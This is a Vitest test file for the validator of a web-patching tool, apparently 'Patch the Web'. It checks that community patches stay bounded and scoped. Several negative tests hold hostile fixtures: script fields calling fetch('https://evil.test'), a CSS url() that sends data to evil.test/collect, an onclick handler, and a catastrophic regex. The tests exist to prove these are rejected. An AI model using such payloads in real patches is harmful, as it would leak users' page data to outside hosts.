// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import civicPatch from "../src/registry/patches/civic-apply.patch-the-web.json";
import metroCarePatch from "../src/registry/patches/metrocare-service-navigator.patch-the-web.json";
import nuKarachiPatch from "../src/registry/patches/nu-karachi-degree-programs.patch-the-web.json";
import hecCampusPatch from "../src/registry/patches/hec-campus-finder.patch-the-web.json";
import pecProgramPatch from "../src/registry/patches/pec-accredited-program-search.patch-the-web.json";
import { patchMatchesUrl } from "../src/core/matcher";
import type { CommunityPatch } from "../src/core/types";
import { validatePatch } from "../src/core/validator";

describe("Patch the Web policy validator", () => {
  it("accepts the bundled CivicApply repair", () => {
    const result = validatePatch(civicPatch);
    expect(result.ok).toBe(true);
  });

  it("accepts the bounded MetroCare feature repair", () => {
    expect(validatePatch(metroCarePatch).ok).toBe(true);
  });

  it("accepts the domain-scoped Karachi degree-program repair", () => {
    expect(validatePatch(nuKarachiPatch).ok).toBe(true);
  });

  it("accepts the bounded HEC public-table search repair", () => {
    expect(validatePatch(hecCampusPatch).ok).toBe(true);
  });

  it("accepts the bounded PEC public-list search repair", () => {
    expect(validatePatch(pecProgramPatch).ok).toBe(true);
  });

  it("rejects executable or unbounded public-list searches", () => {
    const unsafe = structuredClone(pecProgramPatch) as unknown as { operations: Array<Record<string, unknown>> };
    const operation = unsafe.operations.find((entry) => entry.type === "publicListSearch")!;
    operation.maxItems = 1000;
    operation.script = "fetch('https://evil.test')";
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.issues.some((issue) => issue.path.endsWith("maxItems"))).toBe(true);
      expect(result.issues.some((issue) => issue.path.endsWith("script"))).toBe(true);
    }
  });

  it("rejects executable or unbounded public-table searches", () => {
    const unsafe = structuredClone(hecCampusPatch) as unknown as { operations: Array<Record<string, unknown>> };
    const operation = unsafe.operations.find((entry) => entry.type === "publicTableSearch")!;
    operation.maxRows = 1000;
    operation.script = "fetch('https://evil.test')";
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.issues.some((issue) => issue.path.endsWith("maxRows"))).toBe(true);
      expect(result.issues.some((issue) => issue.path.endsWith("script"))).toBe(true);
    }
  });

  it("blocks collection filters from reading page text or arbitrary attributes", () => {
    const unsafe = structuredClone(metroCarePatch) as typeof metroCarePatch;
    const navigator = unsafe.operations.find((operation) => operation.type === "collectionFilter") as {
      search: { attributes: string[] };
      filters: Array<{ attribute: string }>;
    };
    navigator.search.attributes = ["textContent"];
    navigator.filters[0].attribute = "onclick";
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues.filter((issue) => issue.message.includes("data-*")).length).toBeGreaterThanOrEqual(2);
  });

  it("requires collection-filter preferences to expire", () => {
    const unsafe = structuredClone(metroCarePatch) as typeof metroCarePatch;
    const navigator = unsafe.operations.find((operation) => operation.type === "collectionFilter") as { persist: { ttlMinutes: number } };
    navigator.persist.ttlMinutes = 10081;
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues.some((issue) => issue.path.endsWith("persist.ttlMinutes"))).toBe(true);
  });

  it("keeps collection comparison bounded to declared data attributes", () => {
    const unsafe = structuredClone(metroCarePatch) as typeof metroCarePatch;
    const comparison = unsafe.operations.find((operation) => operation.type === "collectionCompare") as unknown as {
      itemTitleAttribute: string;
      maxItems: number;
      fields: Array<{ attribute: string }>;
    };
    comparison.itemTitleAttribute = "textContent";
    comparison.fields[0].attribute = "onclick";
    comparison.maxItems = 20;
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.issues.filter((issue) => issue.message.includes("data-*")).length).toBeGreaterThanOrEqual(2);
      expect(result.issues.some((issue) => issue.path.endsWith("maxItems"))).toBe(true);
    }
  });

  it("rejects arbitrary script operations", () => {
    const unsafe = structuredClone(civicPatch) as unknown as Record<string, unknown>;
    unsafe.operations = [{ id: "run-script", type: "script", code: "fetch('https://evil.test')" }];
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues.some((issue) => issue.path === "operations[0].type")).toBe(true);
  });

  it("keeps table-column filters bounded and rejects executable fields", () => {
    const unsafe = structuredClone(nuKarachiPatch) as unknown as { operations: Array<Record<string, unknown>> };
    const operation = unsafe.operations.find((entry) => entry.type === "tableColumnFilter")!;
    operation.headerText = " Karachi ";
    operation.collapseOtherColumns = false;
    operation.script = "fetch('https://evil.test')";
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.issues.some((issue) => issue.path.endsWith("headerText"))).toBe(true);
      expect(result.issues.some((issue) => issue.path.endsWith("collapseOtherColumns"))).toBe(true);
      expect(result.issues.some((issue) => issue.path.endsWith("script"))).toBe(true);
    }
  });

  it("rejects network-capable CSS and event-handler attributes", () => {
    const unsafe = structuredClone(civicPatch) as typeof civicPatch;
    unsafe.operations = [
      { id: "leak-data", type: "style", selector: ".field-row", styles: { "background-color": "url(https://evil.test/collect)" } },
      { id: "event-handler", type: "attributes", selector: "#email", attributes: { onclick: "alert(1)" } }
    ] as never;
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
  });

  it("rejects document-root and disguised universal selectors", () => {
    for (const selector of [":root", ":is(*)"]) {
      const unsafe = structuredClone(civicPatch) as typeof civicPatch;
      unsafe.operations[0] = { id: "broad-selector", type: "hide", selector };
      const result = validatePatch(unsafe);
      expect(result.ok).toBe(false);
    }
  });

  it("keeps patches on their declared host and path", () => {
    const patch = civicPatch as CommunityPatch;
    expect(patchMatchesUrl(patch, new URL("http://localhost/demo/"))).toBe(false);
    expect(patchMatchesUrl(patch, new URL("https://patch-the-web.vercel.app/demo/"))).toBe(true);
    expect(patchMatchesUrl(patch, new URL("http://localhost/bank/"))).toBe(false);
    expect(patchMatchesUrl(patch, new URL("https://example.com/demo/"))).toBe(false);
  });

  it("requires a bounded local-draft retention period", () => {
    const unsafe = structuredClone(civicPatch) as typeof civicPatch;
    const persistence = unsafe.operations.find((operation) => operation.type === "persistForm") as { ttlMinutes: number };
    persistence.ttlMinutes = 0;
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues.some((issue) => issue.path.endsWith("ttlMinutes"))).toBe(true);
  });

  it("rejects path wildcards that could silently broaden scope", () => {
    const unsafe = structuredClone(civicPatch) as typeof civicPatch;
    unsafe.match.paths = ["/*/account/*"];
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues.some((issue) => issue.path === "match.paths[0]")).toBe(true);
  });

  it("validates publication assertions instead of trusting receipt metadata", () => {
    const unsafe = structuredClone(civicPatch) as unknown as Record<string, unknown>;
    unsafe.verify = [{ type: "exists", selector: "body", min: 20, max: 1 }];
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues.some((issue) => issue.path.startsWith("verify[0]"))).toBe(true);
  });

  it("rejects regular expressions with catastrophic nested quantifiers", () => {
    const unsafe = structuredClone(civicPatch) as typeof civicPatch;
    const validation = unsafe.operations.find((operation) => operation.type === "validation") as {
      fields: Array<{ rules: Array<{ kind: string; value?: string; message: string }> }>;
    };
    validation.fields[0].rules = [{ kind: "pattern", value: "(a+)+$", message: "Use a valid value." }];
    const result = validatePatch(unsafe);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.issues.some((issue) => issue.message.includes("bounded regular expression"))).toBe(true);
  });
});
